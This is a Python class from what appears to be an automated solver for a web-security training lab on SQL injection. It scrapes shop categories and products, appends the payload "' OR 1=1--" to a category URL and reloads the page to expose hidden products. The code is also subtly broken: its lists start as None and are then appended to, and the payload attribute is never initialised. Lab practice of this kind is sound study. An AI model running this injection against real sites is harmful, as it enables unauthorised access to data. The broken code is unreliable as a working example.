from services.sql_injection.base_sql_injection import SQLInjectionBaseSolver

class HiddenDataSolver(SQLInjectionBaseSolver):
    def __init__(self, URL):
        super().__init__(URL)
        self.categories = None
        self.categories_url = None
        self.products_name = None
        self.products_price = None
        self.products_url = None
        self.payload_url = None

    def solve(self):
        """Solve the lab."""
        self._request_lab()
        self.set_category()
        self.print_categories()
        self.set_products()
        self.print_products()
        self.build_payload()
        self._print_payload(self.payload)
        self.payload_url = self.url+self.categories_url[0]+self.payload
        self.console.log(f"Payload URL: {self.payload_url}")
        self._request_lab()
        self.set_products()
        self.print_products()

        
    def set_category(self):
        """Parse the category."""
        self.console.log("Finding categories")
        categories = self.soup_html.find_all('a', class_='filter-category')
        for category in categories:
            if category.text == "All":
                continue
            self.categories.append(category.text)
            self.categories_url.append(category['href'])

    def print_categories(self):
        """Print the categories."""
        self.console.log("Printing categories")
        self._print_table("Categories Product", ["Category", "URL"],
                          zip(self.categories, self.categories_url))
        
    def set_products(self):
        """Parse the products."""
        self.console.log("Finding products")
        section = self.soup_html.find('section', class_='container-list-tiles')
        products = section.find_all('div', class_='product-tile')
        for product in products:
            self.products_name.append(product.find('h3').get_text())
            self.products_price.append(product.find_all('img')[-1].next_sibling.strip())
            self.products_url.append(product.find('a', class_='button')['href'])
        
    def print_products(self):
        """Print the products."""
        self.console.log("Printing products")
        self._print_table("Products", ["Name", "Price", "URL"],
                          zip(self.products_name, self.products_price, self.products_url))

    def build_payload(self):
        """Build the payload."""
        self.console.log("Building payload")
        self.payload = "' OR 1=1--"
